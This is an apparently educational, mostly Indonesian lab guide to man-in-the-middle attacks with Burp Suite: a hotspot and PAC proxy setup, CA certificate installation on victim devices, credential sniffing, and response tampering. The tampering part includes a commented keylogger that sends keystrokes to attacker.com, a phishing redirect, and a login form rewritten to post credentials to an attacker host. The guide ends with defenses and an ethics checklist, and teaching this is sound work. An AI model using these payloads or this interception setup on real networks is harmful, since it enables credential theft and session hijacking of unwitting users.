# STEP 4: Open in Wireshark
wireshark capture.pcap &

# STEP 5: Filter & Analyze
# In Wireshark, use filter: http
# Look at: HTTP Request & Response
# Examine: Headers, Methods, Status Codes
```

**Expected Observations:**
```
1. HTTP Requests:
   GET /path HTTP/1.1
   Host: example.com
   User-Agent: curl/7.x
   Connection: close

2. HTTP Responses:
   HTTP/1.1 200 OK
   Content-Type: text/html
   Content-Length: 1256
   [HTML content in data section]

3. Headers Analysis:
   ├─ Cache-Control (caching policy)
   ├─ Set-Cookie (session management)
   ├─ Server (web server identification)
   └─ Last-Modified (file modification date)

4. Performance Metrics:
   ├─ Time between request/response
   ├─ Packet retransmissions
   ├─ Window size (bandwidth indication)
   └─ Can calculate response time
```

---

## **tugas 2: Intercept & Sniffing Network Traffic**


---

### **URUTAN SETUP BENAR (CRITICAL):**

```
┌─────────────────────────────────────────────────────────────┐
│     SETUP SEQUENCE - HARUS SESUAI URUTAN INI                │
└─────────────────────────────────────────────────────────────┘

LANGKAH 1: Setup Burp Suite ────────────────┐
LANGKAH 2: Aktifkan Windows Hotspot ────────┤
LANGKAH 3: Buat File Auto Proxy (PAC) ──────├─ PERSIAPAN
LANGKAH 4: Jalankan Web Server PAC ────────┤
LANGKAH 5: Konfigurasi Client Auto Proxy ──┘

LANGKAH 6: Test Koneksi Proxy ──────────────┐
LANGKAH 7: Setup HTTPS/CA Certificate ──────├─ VALIDASI
LANGKAH 8: Aktifkan Intercept Response ────┘

LANGKAH 9: Praktik 2 - Traffic Listening ──────┐
LANGKAH 10: Praktik 3 - Response Modification ─┤─ PRAKTIK
LANGKAH 11: Auto Modify Tanpa Intercept Manual ┘
```

---

### **LANGKAH LENGKAP DENGAN PERINTAH:**

#### **LANGKAH 1: Setup Burp Suite**

```
A. DOWNLOAD & INSTALL BURP SUITE

Windows:
1. Download: https://portswigger.net/burp/communitydownload
2. Run installer: burp-community-vX.X.X-installer.exe
3. Follow install wizard
4. Finish dan launch Burp Suite

Linux/WSL:
1. Download JAR: https://portswigger.net/burp/communitydownload
2. Save ke: /opt/burp/
3. Terminal:
   $ cd /opt/burp
   $ java -jar burpsuite_community_vX.X.X.jar &

macOS:
1. Download DMG
2. Drag to Applications folder
3. Launch Burp Suite from Applications

═════════════════════════════════════════════════════════════

B. CONFIGURE BURP PROXY LISTENERS

1. Launch Burp Suite
2. Menu: Proxy → Settings (atau Options pada versi lama)
3. Tab: Proxy Listeners
4. Existing Listener (127.0.0.1:8080):
   ├─ Bind to address: All interfaces (0.0.0.0)
   ├─ Port: 8080
   ├─ Running: YES (checkbox ticked)
   └─ Support for invisible proxying: ON (jika tersedia)

5. Klik Apply → OK

OUTPUT: 
✓ Burp Proxy listening on 0.0.0.0:8080
✓ Ready to receive connections from any interface
```

---

#### **LANGKAH 2: Aktifkan Windows Hotspot**

**WINDOWS 10/11:**

```
A. ENABLE MOBILE HOTSPOT

Method 1 - Settings GUI:
1. Open: Settings
2. Go to: Network & Internet
3. Left menu: Mobile hotspot
4. Toggle: "Mobile hotspot" → ON
5. Choose internet to share: [Select your connection]
6. Edit: 
   ├─ SSID (Network Name): Lab
   ├─ Password: 123456789
   └─ Band (jika ada): 5GHz (recommended) atau 2.4GHz
7. Save & back to previous screen

Output:
✓ Mobile hotspot is ON
✓ Connected devices: 0 (ready for clients)

═════════════════════════════════════════════════════════════

B. FIND HOTSPOT IP ADDRESS

Windows Command Prompt:
```
ipconfig
```

Cari section "Wireless LAN adapter Local Area Connection":

```
Wireless LAN adapter Local Area Connection* X:
   Description . . . . . . . . . . . . : Virtual WiFi Miniport Adapter
   Physical Address. . . . . . . . . . : 00-11-22-33-44-55
   DHCP Enabled. . . . . . . . . . . . : Yes
   IPv4 Address . . . . . . . . . . . . : 192.168.137.1
                                          ↑ CATAT IP INI
   Subnet Mask . . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . . : 192.168.137.1
   DHCP Server . . . . . . . . . . . . : 192.168.137.1
```

**PENTING**: IP hotspot biasanya **192.168.137.1**

═════════════════════════════════════════════════════════════

C. VERIFY HOTSPOT IS BROADCASTING

Windows Command Prompt:
```
netsh wlan show hostednetwork
```

Output:
```
Interface Name : Virtual WiFi Miniport Adapter
Hosted network status : Enabled
SSID : Lab
Max number of clients : 100
Network type : Infrastructure
Channel : 11
Authentication : WPA2-Personal
Cipher : CCMP
Status of hosted network : Started
```

✓ Hotspot aktif dan siap menerima koneksi
```

---

#### **LANGKAH 3: Buat File Auto Proxy (PAC)**

**Tujuan**: Client otomatis menggunakan Burp proxy tanpa setting manual.

**WINDOWS:**

```batch
# BUAT FOLDER PROXY
mkdir C:\proxy
cd C:\proxy

# BUAT FILE proxy.pac DENGAN NOTEPAD
notepad proxy.pac
```

**ISI FILE proxy.pac:**
```javascript
function FindProxyForURL(url, host) {
    // Redirect semua traffic ke Burp Suite di 192.168.137.1:8080
    return "PROXY 192.168.137.1:8080; DIRECT";
}
```

Simpan file sebagai: `C:\proxy\proxy.pac`

**VERIFIKASI FILE:**
```batch
# Check isi file
type C:\proxy\proxy.pac

# Output harus menampilkan isi function di atas
```

═════════════════════════════════════════════════════════════

**LINUX/WSL:**

```bash
# Buat folder
mkdir -p ~/proxy
cd ~/proxy

# Buat file proxy.pac
cat > proxy.pac << 'EOF'
function FindProxyForURL(url, host) {
    return "PROXY 192.168.137.1:8080; DIRECT";
}
EOF

# Verify
cat proxy.pac
ls -la proxy.pac
```

---

#### **LANGKAH 4: Jalankan Web Server untuk PAC**

**WINDOWS:**

```batch
# JALANKAN PYTHON HTTP SERVER
cd C:\proxy
python -m http.server 80

# OUTPUT:
# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
# [INFO] Server requests:
# 127.0.0.1 - - [24/Dec/2025 10:15:30] "GET /proxy.pac HTTP/1.1" 200 -
```

⚠️ PENTING: 
- Port 80 memerlukan admin privileges
- Jika error "Permission denied", gunakan port 8000 (tapi ubah juga client config)
- Server akan berjalan di foreground, buka terminal baru untuk perintah selanjutnya

**JIKA PORT 80 TIDAK BISA:**

```batch
# Gunakan port 8000 (tidak perlu admin)
python -m http.server 8000

# Lalu update PAC URL di client menjadi:
# http://192.168.137.1:8000/proxy.pac
```

═════════════════════════════════════════════════════════════

**LINUX/WSL:**

```bash
# Buka terminal baru di direktori ~/proxy
cd ~/proxy

# JALANKAN HTTP SERVER
python3 -m http.server 80

# atau jika Python 2:
python -m SimpleHTTPServer 80

# OUTPUT:
# Serving HTTP on 0.0.0.0 port 80 ...
# 192.168.137.X - - [24/Dec/2025 10:15:30] "GET /proxy.pac" HTTP/1.1" 200 -
```

**TEST PAC SERVER:**

Dari host computer, buka browser:

```
http://192.168.137.1/proxy.pac

# Harus menampilkan isi file proxy.pac:
function FindProxyForURL(url, host) {
    return "PROXY 192.168.137.1:8080; DIRECT";
}
```

✓ Jika file tampil → PAC server siap!
✗ Jika error/timeout → Check firewall atau IP address

---

#### **LANGKAH 5: Konfigurasi Client untuk Auto Proxy**

Client device (laptop, phone) yang akan dimonitor.

**WINDOWS LAPTOP CLIENT:**

```
Pengaturan Otomatis via PAC:

1. Open: Settings
2. Go to: Network & Internet
3. Left menu: Proxy
4. Automatic proxy setup: ON
5. Use setup script: ENABLE
6. Script address: http://192.168.137.1/proxy.pac
7. Save

Atau via Registry (advanced):
Windows Key + R → regedit
Pergi ke: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings
├─ AutoConfigURL = http://192.168.137.1/proxy.pac
└─ AutoDetect = 0
```

═════════════════════════════════════════════════════════════

**ANDROID PHONE CLIENT:**

```
1. Settings → WiFi
2. Long-press connected WiFi network → Edit
3. Advanced options
4. Proxy: Select "Auto-config"
5. PAC URL: http://192.168.137.1/proxy.pac
6. Save

Verify:
Open browser → Visit: http://burp
Jika ada prompt untuk download Burp CA cert → Connected ke proxy ✓
```

═════════════════════════════════════════════════════════════

**macOS / Linux LAPTOP CLIENT:**

```bash
# macOS System Preferences:
System Preferences → Network → Wi-Fi → Advanced → Proxies
├─ Automatic Proxy Configuration: ENABLE
├─ Proxy Configuration URL: http://192.168.137.1/proxy.pac
└─ Apply

# Linux (GNOME Desktop):
Settings → Network → WiFi → Connected Network → Advanced
├─ Proxy: Automatic
├─ Configuration URL: http://192.168.137.1/proxy.pac
└─ Apply
```

---

#### **LANGKAH 6: Test Koneksi Proxy**

**DI BURP SUITE (ATTACKER MACHINE):**

```
1. Menu: Proxy → Intercept
2. Tab: Intercept → Intercept is ON (button berubah jadi hijau)
3. PASTIKAN: "Intercept server responses" juga ON
   (Proxy → Settings → Intercept Client Requests/Responses)
```

**DI CLIENT DEVICE:**

```
Buka browser, coba akses:
http://example.com

Apa yang terjadi:
- Browser loading... loading... (STUCK)
- Tidak pernah selesai load
- Karena Burp intercept request
```

**KEMBALI KE BURP:**

```
Tab: Proxy → Intercept

HARUS MUNCUL:

GET / HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
Connection: keep-alive
Accept: text/html,application/xhtml+xml...

Jika muncul → PROXY BERHASIL DIKONFIGURASI ✓
Jika tidak muncul → Check:
  ├─ Apakah PAC URL benar?
  ├─ Apakah Burp proxy listener aktif?
  ├─ Apakah client terhubung ke hotspot?
  └─ Apakah firewall memblokir port 8080?
```

**KLIK FORWARD** untuk lanjut ke langkah berikutnya.

---

#### **LANGKAH 7: Setup HTTPS/CA Certificate**

Untuk dapat meng-intercept dan modify HTTPS traffic, client harus trust Burp CA certificate.

**DI CLIENT DEVICE:**

```
Buka browser, akses:
http://burp

Atau:
http://192.168.137.1:8080

Halaman akan muncul:
┌────────────────────────────────┐
│ PortSwigger Web Security       │
│ Burp Suite Community Edition   │
│                                │
│ [Download CA Certificate]      │ ← CLICK HERE
└────────────────────────────────┘
```

**WINDOWS LAPTOP CLIENT:**

```
1. Download berhasil: cacert.der
2. Double-click cacert.der → Install Certificate wizard
3. Store Location: 
   Select: "Current User" (atau "Local Machine" untuk all users)
4. Next
5. Certificate Store: 
   Select: "Place all certificates in..."
   Browse → "Trusted Root Certification Authorities"
6. Finish
7. Security Warning: Click "Yes" to install

Verify:
Windows Key + R → certmgr.msc
Pergi ke: Trusted Root Certification Authorities → Certificates
Cari: PortSwigger atau Burp (harus ada)
```

═════════════════════════════════════════════════════════════

**ANDROID PHONE CLIENT:**

```
1. Download: burp certificate (cacert.der atau .crt)
2. Settings → Security → Install from storage
3. Select certificate file
4. Choose name: "BurpCA" atau "PortSwigger"
5. Use for: VPN and apps (atau Secure content)
6. Install

Verify:
Settings → Security → Encryption and credentials → Trusted credentials → User
Cari: PortSwigger atau Burp (harus ada)
```

═════════════════════════════════════════════════════════════

**LINUX LAPTOP CLIENT:**

```bash
# Download certificate
wget http://192.168.137.1:8080/cert

# Copy to system CA directory
sudo cp burp.der /usr/local/share/ca-certificates/burp.crt

# Update CA store
sudo update-ca-certificates

# Verify
grep -r "Burp" /etc/ssl/certs/

# Untuk Firefox (uses own store):
# Preferences → Privacy & Security → Certificates → View Certificates
# → Authorities → Import → Select burp certificate
```

✓ Setelah certificate ter-install, HTTPS traffic dapat di-intercept.

---

#### **LANGKAH 8: Aktifkan Intercept Response**

**DI BURP SUITE:**

Ini adalah langkah KUNCI untuk Praktik 3.

```
Menu: Proxy → Settings

Tab: Intercept Client Requests
├─ Intercept requests based on the following rules:
│  ├─ URL path matches: (leave empty untuk catch all)
│  └─ Method: (leave empty)
└─ Status: Checked (enabled)

Tab: Intercept Server Responses
├─ Intercept responses based on the following rules:
│  ├─ HTTP method: (leave empty)
│  ├─ URL path matches: (leave empty)
│  ├─ Response MIME type: (leave empty)
│  └─ Status: Checked (enabled) ← PENTING!
└─ Intercept responses based on the following rules

Tombol "Intercept is on" (di Intercept tab):
├─ Hijau = ON (akan menangkap semua)
└─ Merah = OFF
```

**PERHATIAN**: 
- "Intercept is on" menangkap semua request
- "Intercept server responses" menangkap semua response
- Keduanya HARUS ON untuk Praktik 3

---

### **PRAKTIK 2: TRAFFIC LISTENING/MONITORING (TANPA MODIFIKASI)**

**Tujuan**: Monitor dan inspect traffic tanpa memodifikasi apapun. Hanya lihat apa yang diakses client.

#### **SETUP PRAKTIK 2:**

```
DI BURP SUITE:

1. Proxy → Intercept
2. Toggle: "Intercept is on" → OFF (merah)
   (Semua traffic auto-forward tanpa pause)

3. Tab: HTTP History
   (Akan menampilkan semua traffic yang lewat)

4. Tab: WebSocket history
   (Untuk monitoring WebSocket connections)
```

#### **JALANKAN PRAKTIK 2:**

**DI CLIENT DEVICE:**

Client bisa browsing normal tanpa terganggu:
```
1. Buka browser
2. Kunjungi berbagai website:
   - http://example.com
   - http://httpbin.org/get
   - http://testphp.vulnweb.com
   - Login ke suatu website

3. Browser berjalan normal (tidak stuck)
```

**DI BURP SUITE - AMATI:**

```
Tab: Proxy → HTTP History

Akan terlihat semua request yang dikirim client:

┌────┬──────────┬────────────┬──────────┬──────────┬──────────┐
│ #  │ Host     │ Method     │ Path     │ Status   │ Length   │
├────┼──────────┼────────────┼──────────┼──────────┼──────────┤
│ 1  │example.c │ GET        │ /        │ 200      │ 1256 B   │
│ 2  │example.c │ GET        │ /style.c │ 200      │ 45 KB    │
│ 3  │httpbin.o │ POST       │ /post    │ 200      │ 523 B    │
│ 4  │testphp.v │ GET        │ /index.p │ 200      │ 2.3 KB   │
│ 5  │testphp.v │ POST       │ /login.p │ 302      │ 0 B      │
│ 6  │testphp.v │ GET        │ /admin   │ 200      │ 1.5 KB   │
└────┴──────────┴────────────┴──────────┴──────────┴──────────┘

KLIK REQUEST #5 (POST /login) → Lihat details:

REQUEST:
POST /login.php HTTP/1.1
Host: testphp.vulnweb.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

username=admin&password=Admin123456789
        ↑                   ↑
        CATAT! (Plaintext credentials)

RESPONSE:
HTTP/1.1 302 Found
Location: /admin
Set-Cookie: sessionid=abc123def456...
        ↑ CATAT! (Session cookie)
```

**ANALISIS PRAKTIK 2:**

```
FINDINGS:
1. ✗ HTTP digunakan (plaintext, bukan HTTPS)
2. ✓ Credentials visible: admin / Admin123456789
3. ✓ Session cookie visible: abc123def456
4. ✓ Semua URLs yang dikunjungi terlihat
5. ✓ File apa yang didownload terlihat

SECURITY IMPLICATIONS:
- Attacker dapat steal credentials
- Attacker dapat hijack session cookie
- Attacker tahu exact websites yang dikunjungi
- Data sensitif bisa dilihat

LESSON LEARNED:
→ SELALU GUNAKAN HTTPS untuk login dan data sensitif
→ Even if encrypted, DNS queries still visible
→ Use DNS-over-HTTPS (DoH) untuk privacy lebih
```

#### **DEMO PRAKTIK 2 - STEP BY STEP:**

**WINDOWS ATTACKER MACHINE:**

```batch
# Terminal 1: Jalankan Burp Suite
java -jar C:\burp\burpsuite_community.jar

# Terminal 2: Jalankan PAC Server
cd C:\proxy
python -m http.server 80

# (Burp + PAC server berjalan di background)
```

**CLIENT DEVICE (MONITORING):**

```
Di Burp → HTTP History, lihat request client secara real-time:

┌─────────────────────────────────────────────────────────────┐
│ TIMELINE MONITORING:                                         │
├─────────────────────────────────────────────────────────────┤
│ 10:15:30 | Client connect ke WiFi hotspot                   │
│ 10:15:35 | Client buka Chrome                               │
│ 10:15:40 | GET example.com (unencrypted HTTP!)              │
│ 10:15:42 | GET /style.css                                   │
│ 10:15:45 | GET /script.js                                   │
│ 10:16:00 | POST /login.php [username/password VISIBLE]      │
│ 10:16:02 | GET /admin (redirect 302)                        │
│ 10:16:05 | GET /dashboard                                   │
│ 10:16:30 | Client buka email client                         │
│ 10:16:35 | SMTP outgoing [plaintext email VISIBLE!]         │
│ 10:17:00 | Client download file dari:                       │
│          | http://file-server.local/document.pdf (visible!) │
└─────────────────────────────────────────────────────────────┘

KESIMPULAN: Semua aktivitas client terlihat jelas!
```

---

### **PRAKTIK 3: RESPONSE MODIFICATION (MENGUBAH RESPONSE)**

**Tujuan**: Intercept response dari server dan modifikasi sebelum dikirim ke client. Client akan menerima versi modifikasi dari attacker.

#### **SETUP PRAKTIK 3:**

```
DI BURP SUITE:

1. Proxy → Settings
2. Tab: Intercept Server Responses
   ├─ Intercept responses based on the following rules
   └─ Status: ✓ ENABLE

3. Proxy → Intercept
4. Tab: Intercept
   ├─ "Intercept is on" = ON (hijau)
   ├─ "Intercept responses" = ON (hijau)
   └─ Now Burp will pause EVERY response sebelum dikirim ke client

5. Ensure "Intercept server responses" is CHECKED in settings
```

#### **METHOD 1: MANUAL INTERCEPT & MODIFY RESPONSE**

**JALANKAN PRAKTIK 3:**

```
DI CLIENT DEVICE:

1. Buka browser
2. Kunjungi: http://testphp.vulnweb.com/

Hasil: Page loading, loading, STUCK (paused at server response)
```

**DI BURP SUITE:**

```
Tab: Proxy → Intercept

Akan muncul SERVER RESPONSE yang sedang di-intercept:

┌──────────────────────────────────────────────────────────────┐
│ HTTP/1.1 200 OK                                              │
│ Date: Tue, 24 Dec 2025 10:15:30 GMT                         │
│ Server: Apache/2.4.41 (Ubuntu)                              │
│ Content-Type: text/html; charset=UTF-8                      │
│ Content-Length: 2543                                         │
│ Connection: close                                             │
│                                                               │
│ <!DOCTYPE html>                                              │
│ <html>                                                        │
│ <head>                                                        │
│   <title>testphp.vulnweb.com</title>                         │
│ </head>                                                       │
│ <body>                                                        │
│   <h1>Welcome to testphp.vulnweb.com</h1>                   │
│   <p>This is a vulnerable demo website</p>                  │
│   ...                                                         │
│ </body>                                                       │
│ </html>                                                       │
└──────────────────────────────────────────────────────────────┘

Sekarang EDIT response di atas:
```

**MODIFIKASI 1: UBAH JUDUL WEBSITE**

```
Cari di response:
<title>testphp.vulnweb.com</title>

Ubah menjadi:
<title>🔒 INTERCEPTED BY BURP SUITE 🔒</title>

Klik tombol: [Forward]
```

**DI CLIENT DEVICE:**

```
Browser selesai loading.

HASIL: 
✓ Tab browser title: "🔒 INTERCEPTED BY BURP SUITE 🔒"
✓ Tapi server asli tidak pernah mengirim title itu!
✓ Client menerima versi MODIFIKASI dari attacker!
```

═════════════════════════════════════════════════════════════

**MODIFIKASI 2: INJECT BANNER KE WEBSITE**

```
Di Burp intercept tab (jangan tutup yet):

Cari di response:
</body>

Sebelum </body>, tambahkan:

<div style="position:fixed;top:0;left:0;width:100%;height:60px;
background:red;color:white;font-size:18px;font-weight:bold;
text-align:center;padding-top:10px;z-index:9999;font-family:Arial;">
⚠️ WARNING: THIS WEBSITE HAS BEEN INTERCEPTED BY BURP SUITE ⚠️
</div>

HASIL DI CLIENT:
- Red banner muncul di atas website
- Banner tidak bisa di-hide/di-close
- Clear evidence of MITM attack
```

═════════════════════════════════════════════════════════════

**MODIFIKASI 3: INJECT JAVASCRIPT PAYLOAD**

```
Cari: </body>

Tambahkan sebelum closing tag:

<script>
// Alert user
alert('Your credentials have been captured!\nUsername: admin\nPassword: Admin123456789');

// atau redirect ke phishing page:
// window.location.href = 'http://attacker.com/phishing';

// atau keylogger:
// document.onkeypress = function(e) {
//   fetch('http://attacker.com/log?key=' + e.key);
// }
</script>

HASIL:
- Alert pop-up muncul di client
- JavaScript executed di browser client
- Can be used untuk credential harvesting
- Can redirect ke phishing page
- Can log keystrokes (keylogger)
```

═════════════════════════════════════════════════════════════

**MODIFIKASI 4: HIJACK FORM SUBMISSION**

```
Jika client visit form login page:

Original form:
<form action="http://testphp.vulnweb.com/login.php" method="POST">
  <input type="username" name="username">
  <input type="password" name="password">
  <input type="submit">
</form>

Ubah menjadi:
<form action="http://ATTACKER.com/steal-credentials.php" method="POST">
  <input type="username" name="username">
  <input type="password" name="password">
  <input type="submit">
</form>

HASIL:
- Ketika client submit form
- Credentials dikirim ke attacker server
- Bukan ke original server!
- Original login juga fail (bonus buat attacker)
```

---

#### **METHOD 2: AUTO MODIFY (TANPA INTERCEPT MANUAL)**

Praktik 3 dengan manual intercept setiap response sangat lambat. Burp menyediakan cara otomatis.

**DI BURP SUITE:**

```
Menu: Proxy → Settings

Tab: Match and Replace

TAMBAHKAN RULE BARU:

┌─────────────────────────────────────────────┐
│ Add rule                                     │
├─────────────────────────────────────────────┤
│ Type:              [Response body]           │
│ Match:             </body>                   │
│ Replace:           <h1 style="color:red;">  │
│                    MITM ACTIVE!              │
│                    </h1></body>              │
│ Regex match:       [unchecked]               │
│ Case sensitive:    [unchecked]               │
│ Enabled:           [CHECKED] ← PENTING!     │
├─────────────────────────────────────────────┤
│ [Add] [Update] [Remove] [Copy]              │
└─────────────────────────────────────────────┘

Klik: [Add]
```

**HASIL:**

```
Sekarang SEMUA website yang dikunjungi client akan:

1. Otomatis modified tanpa intercept manual
2. Setiap </body> diganti dengan <h1>MITM ACTIVE!</h1></body>
3. SEMUA request/response diproses otomatis
4. Browser loading normal (tidak stuck)

Client membuka: http://example.com
Browser berhasil load, tapi pada akhir page ada:
┌─────────────────────────────┐
│ MITM ACTIVE!                │
│ (warna merah, besar)        │
└─────────────────────────────┘
```

---

#### **PRAKTIK 3 LANJUTAN - REALISTIC SCENARIOS:**

**SCENARIO 1: Corporate Network Abuse**

```
Attacker: Pegawai di WiFi kantor dengan Burp proxy
Victim: CEO membuka banking website
Burp intercept: 
├─ Captures login credentials
├─ Captures OTP (one-time password)
├─ Intercepts HTTPS? 
│  → If certificate trust: YES (decrypted)
│  → If not trusted: NO (encrypted)

Result:
- CEO credentials compromised
- Banking transactions can be modified
- Money stolen
```

═════════════════════════════════════════════════════════════

**SCENARIO 2: Coffee Shop WiFi Attack**

```
Attacker: Hacker at coffee shop with Burp proxy
Victim: Tourist using free WiFi
Burp activities:
├─ Captures all unencrypted emails
├─ Steals email passwords
├─ Captures credit card info (if HTTP payment used!)
├─ Modifies website untuk phishing

Result:
- Tourist account compromised
- Financial data stolen
- Email account hacked
- Identity theft possible
```

═════════════════════════════════════════════════════════════

**SCENARIO 3: ISP-Level MITM (Nation-State)**

```
Attacker: ISP atau government agency with access to internet backbone
Victim: Any citizen
Capability:
├─ Intercept ALL traffic (pervasive surveillance)
├─ Modify any website content (propaganda)
├─ Inject malware into unencrypted downloads
├─ Block specific websites (censorship)

Mitigation:
- HTTPS (encryption)
- DNS-over-HTTPS (privacy)
- VPN with encryption (anonymity)
```

---

### **PERBANDINGAN: PRAKTIK 2 vs PRAKTIK 3**

```
┌────────────────────┬──────────────────────┬──────────────────────┐
│ ASPEK              │ PRAKTIK 2             │ PRAKTIK 3             │
│                    │ (LISTENING)           │ (MODIFICATION)        │
├────────────────────┼──────────────────────┼──────────────────────┤
│ Tujuan             │ Monitor traffic       │ Modify response       │
│                    │ tanpa ubah apapun     │ sebelum client terima │
├────────────────────┼──────────────────────┼──────────────────────┤
│ Intercept Mode     │ OFF (auto-forward)    │ ON (pause & inspect)  │
│                    │ Tidak mengganggu UX   │ Client bisa lihat     │
│                    │                       │ delay di page load    │
├────────────────────┼──────────────────────┼──────────────────────┤
│ Method             │ HTTP History tab      │ Intercept tab +       │
│                    │ saja untuk monitor    │ Match & Replace rules │
├────────────────────┼──────────────────────┼──────────────────────┤
│ Visibility         │ ✓ Usernames/Pass     │ ✓ Usernames/Pass      │
│ Ke Attacker        │ ✓ Cookies             │ ✓ Cookies             │
│                    │ ✓ URLs visited        │ ✓ URLs visited        │
│                    │ ✗ Modify content      │ ✓ Modify content      │
│                    │ ✗ Inject malware      │ ✓ Inject malware      │
│                    │ ✗ Phishing redirect   │ ✓ Phishing redirect   │
├────────────────────┼──────────────────────┼──────────────────────┤
│ Risk Level         │ MEDIUM                │ HIGH / CRITICAL       │
│                    │ (Data theft)          │ (Data theft +         │
│                    │                       │  Malware injection)   │
├────────────────────┼──────────────────────┼──────────────────────┤
│ Detection          │ Browser slow/lag      │ Browser VERY slow     │
│ By User            │ Delays di network     │ visible page changes  │
│                    │ (subtle)              │ strange content       │
│                    │                       │ (obvious)             │
├────────────────────┼──────────────────────┼──────────────────────┤
│ Defense            │ Use HTTPS             │ Use HTTPS             │
│                    │ Use VPN               │ Use VPN               │
│                    │ Certificate pinning   │ Certificate pinning   │
│                    │ DNS-over-HTTPS        │ DNS-over-HTTPS        │
├────────────────────┼──────────────────────┼──────────────────────┤
│ Real-world Attack  │ Credential harvesting │ Malware injection     │
│ Examples           │ Financial data theft  │ Ransomware delivery   │
│                    │ Email account breach  │ Banking trojans       │
│                    │ Personal info leak    │ Government spyware    │
└────────────────────┴──────────────────────┴──────────────────────┘
```

---

### **LAB REPORT TEMPLATE - PRAKTIK 2 & 3**

```
═══════════════════════════════════════════════════════════════════
                BURP SUITE MITM LAB REPORT
                Praktik 2 & 3 - Listening & Modification
═══════════════════════════════════════════════════════════════════

SETUP INFORMATION:
├─ Attacker Machine IP: 192.168.137.1
├─ Attacker OS: Windows / Linux / macOS
├─ Burp Suite Version: Community Edition vX.X.X
├─ PAC Server: http://192.168.137.1/proxy.pac
├─ Proxy Address: 192.168.137.1:8080
└─ Test Date: [DATE]

CLIENT DEVICE:
├─ Device Type: Laptop / Phone / Tablet
├─ Client IP: 192.168.X.X
├─ Client OS: Windows / Android / iOS / macOS
├─ Browser: Chrome / Firefox / Safari
└─ Network Connection: WiFi Hotspot

═══════════════════════════════════════════════════════════════════
PRAKTIK 2: TRAFFIC LISTENING RESULTS
═══════════════════════════════════════════════════════════════════

TRAFFIC CAPTURED:
Total HTTP Requests: _______
Total HTTPS Requests: _______
Total Response: _______
Duration: _______ minutes

DISCOVERED WEBSITES:
1. http://example.com
   ├─ Request Method: GET
   ├─ Status: 200 OK
   └─ Content Length: 1256 bytes

2. http://bank.lab.local/login
   ├─ Request Method: POST
   ├─ Status: 302 Redirect
   ├─ Credentials captured: YES
   │  ├─ Username: admin
   │  └─ Password: Admin123456789
   └─ Risk: CRITICAL

3. [other websites]

SENSITIVE DATA CAPTURED:
├─ User Credentials:
│  ├─ admin / Admin123456789 (bank.lab.local)
│  └─ user@email / MyPassword123 (email.com)
│
├─ Session Cookies:
│  ├─ sessionid: abc123def456ghi789
│  ├─ auth_token: xyz789abc123def456
│  └─ [other cookies]
│
├─ Email Contents:
│  ├─ From: john@company.com
│  ├─ To: manager@company.com
│  ├─ Subject: Confidential Project Details
│  └─ [email body visible in plain text]
│
└─ Personal Information:
   ├─ Name: John Doe
   ├─ Phone: +1-555-0123
   ├─ Email: john@example.com
   └─ Address: 123 Main St, Anytown, USA

═══════════════════════════════════════════════════════════════════
PRAKTIK 3: RESPONSE MODIFICATION RESULTS
═══════════════════════════════════════════════════════════════════

MODIFICATIONS PERFORMED:

Modification 1: Title Change
├─ Target: http://example.com/
├─ Original Title: "Example Domain"
├─ Modified Title: "🔒 INTERCEPTED BY BURP SUITE 🔒"
├─ Result: SUCCESS ✓
└─ Client Visibility: Title changed in browser tab

Modification 2: Banner Injection
├─ Target: All websites
├─ Injection: Red warning banner
├─ Content: "WARNING: THIS WEBSITE HAS BEEN INTERCEPTED"
├─ Result: SUCCESS ✓
└─ Client Visibility: Banner visible on all pages

Modification 3: JavaScript Injection
├─ Target: http://testphp.vulnweb.com/login
├─ Payload: alert('Credentials captured!');
├─ Result: SUCCESS ✓
└─ Client Visibility: Alert pop-up appeared

Modification 4: Form Action Hijacking
├─ Target: Login form on banking website
├─ Original Action: http://bank.lab/login.php
├─ Modified Action: http://attacker.com/steal.php
├─ Result: SUCCESS ✓
├─ Client Impact: Credentials sent to attacker server
└─ Undetectable: YES (client won't know difference)

═══════════════════════════════════════════════════════════════════
KEY FINDINGS & VULNERABILITIES
═══════════════════════════════════════════════════════════════════

CRITICAL ISSUES:
✗ HTTP traffic completely unencrypted
✗ Credentials transmitted in plain text
✗ No certificate validation on client side
✗ Susceptible to MITM attacks
✗ Response modification undetected

HIGH PRIORITY ISSUES:
✗ Cookies session tokens visible
✗ Email contents exposed
✗ Personal information leaked
✗ Form hijacking possible
✗ Malware injection possible

═══════════════════════════════════════════════════════════════════
ATTACK SCENARIOS DEMONSTRATED
═══════════════════════════════════════════════════════════════════

Scenario 1: Credential Theft
├─ Method: Monitor unencrypted POST requests
├─ Risk: Unauthorized account access
├─ Impact: Financial loss, identity theft
└─ Lesson: Always use HTTPS for authentication

Scenario 2: Session Hijacking
├─ Method: Steal session cookie, replay to server
├─ Risk: Impersonate victim user
├─ Impact: Unauthorized transactions, data access
└─ Lesson: Use Secure + HttpOnly cookies, HTTPS only

Scenario 3: Content Modification
├─ Method: Inject malware into website response
├─ Risk: Client downloads infected files
├─ Impact: Computer compromise, ransomware
└─ Lesson: Use HTTPS, certificate pinning, signature verification

═══════════════════════════════════════════════════════════════════
SECURITY RECOMMENDATIONS
═══════════════════════════════════════════════════════════════════

Priority 1 (CRITICAL):
☐ Enforce HTTPS on all websites (HTTP → redirect HTTPS)
☐ Use HSTS (HTTP Strict Transport Security) header
☐ Implement certificate pinning
☐ Never transmit credentials in plain text

Priority 2 (HIGH):
☐ Use HTTPS-only mode in browsers
☐ Enable DNS-over-HTTPS (DoH) or DNS-over-TLS
☐ Use VPN when on public WiFi
☐ Educate users about MITM risks

Priority 3 (MEDIUM):
☐ Implement web application firewall (WAF)
☐ Use content security policy (CSP) headers
☐ Monitor for suspicious modifications
☐ Regular security audits

═══════════════════════════════════════════════════════════════════
ETHICAL CONSIDERATIONS & LEGAL COMPLIANCE
═══════════════════════════════════════════════════════════════════

Authorization Level: [Authorized / Unauthorized - State clearly]
Testing Scope: [Internal lab / Controlled network]
Written Permission: [Obtained from: _______________]
Testing Timeframe: [Date] to [Date]

Compliance with:
☐ CFAA (Computer Fraud & Abuse Act) - NO UNAUTHORIZED ACCESS
☐ GDPR (if applicable) - Personal data handled securely
☐ Company Policy - Approved by management
☐ Ethical Guidelines - Educational purpose only

═══════════════════════════════════════════════════════════════════
CONCLUSION
═══════════════════════════════════════════════════════════════════

